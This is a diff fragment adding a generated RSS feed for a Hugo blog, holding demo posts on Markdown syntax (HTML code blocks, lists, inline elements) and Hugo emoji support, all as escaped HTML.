+&lt;pre&gt;&lt;code&gt;&amp;lt;!doctype html&amp;gt;
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+&amp;lt;head&amp;gt;
+  &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+  &amp;lt;title&amp;gt;Example HTML5 Document&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+  &amp;lt;p&amp;gt;Test&amp;lt;/p&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;code-block-with-hugos-internal-highlight-shortcode&#34;&gt;Code block with Hugo&amp;rsquo;s internal highlight shortcode&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Example HTML5 Document&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Test&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2 id=&#34;list-types&#34;&gt;List Types&lt;/h2&gt;
+&lt;h4 id=&#34;ordered-list&#34;&gt;Ordered List&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;First item&lt;/li&gt;
+&lt;li&gt;Second item&lt;/li&gt;
+&lt;li&gt;Third item&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;unordered-list&#34;&gt;Unordered List&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;List item&lt;/li&gt;
+&lt;li&gt;Another item&lt;/li&gt;
+&lt;li&gt;And another item&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;nested-list&#34;&gt;Nested list&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Fruit
+&lt;ul&gt;
+&lt;li&gt;Apple&lt;/li&gt;
+&lt;li&gt;Orange&lt;/li&gt;
+&lt;li&gt;Banana&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Dairy
+&lt;ul&gt;
+&lt;li&gt;Milk&lt;/li&gt;
+&lt;li&gt;Cheese&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;other-elements--abbr-sub-sup-kbd-mark&#34;&gt;Other Elements — abbr, sub, sup, kbd, mark&lt;/h2&gt;
+&lt;p&gt;&lt;!-- raw HTML omitted --&gt;GIF&lt;!-- raw HTML omitted --&gt; is a bitmap image format.&lt;/p&gt;
+&lt;p&gt;H&lt;!-- raw HTML omitted --&gt;2&lt;!-- raw HTML omitted --&gt;O&lt;/p&gt;
+&lt;p&gt;X&lt;!-- raw HTML omitted --&gt;n&lt;!-- raw HTML omitted --&gt; + Y&lt;!-- raw HTML omitted --&gt;n&lt;!-- raw HTML omitted --&gt; = Z&lt;!-- raw HTML omitted --&gt;n&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;Press &lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;CTRL&lt;!-- raw HTML omitted --&gt;+&lt;!-- raw HTML omitted --&gt;ALT&lt;!-- raw HTML omitted --&gt;+&lt;!-- raw HTML omitted --&gt;Delete&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt; to end the session.&lt;/p&gt;
+&lt;p&gt;Most &lt;!-- raw HTML omitted --&gt;salamanders&lt;!-- raw HTML omitted --&gt; are nocturnal, and hunt for insects, worms, and other small creatures.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;The above quote is excerpted from Rob Pike&amp;rsquo;s &lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=PAAkCSZUG1c&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;talk&lt;/a&gt; during Gopherfest, November 18, 2015.&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;</description>
+        </item>
+        <item>
+        <title>Emoji Support</title>
+        <link>https://coollllllll.github.io/p/emoji-support/</link>
+        <pubDate>Tue, 05 Mar 2019 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/emoji-support/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/emoji-support/the-creative-exchange-d2zvqp3fpro-unsplash.jpg" alt="Featured image of post Emoji Support" /&gt;&lt;p&gt;Emoji can be enabled in a Hugo project in a number of ways.&lt;/p&gt;
+&lt;p&gt;The &lt;a class=&#34;link&#34; href=&#34;https://gohugo.io/functions/emojify/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;&lt;code&gt;emojify&lt;/code&gt;&lt;/a&gt; function can be called directly in templates or &lt;a class=&#34;link&#34; href=&#34;https://gohugo.io/templates/shortcode-templates/#inline-shortcodes&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Inline Shortcodes&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;To enable emoji globally, set &lt;code&gt;enableEmoji&lt;/code&gt; to &lt;code&gt;true&lt;/code&gt; in your site&amp;rsquo;s &lt;a class=&#34;link&#34; href=&#34;https://gohugo.io/getting-started/configuration/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;configuration&lt;/a&gt; and then you can type emoji shorthand codes directly in content files; e.g.&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;The &lt;a class=&#34;link&#34; href=&#34;http://www.emoji-cheat-sheet.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Emoji cheat sheet&lt;/a&gt; is a useful reference for emoji shorthand codes.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;N.B.&lt;/strong&gt; The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;.emoji {
+  font-family: Apple Color Emoji, Segoe UI Emoji, NotoColorEmoji, Segoe UI Symbol, Android Emoji, EmojiSymbols;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
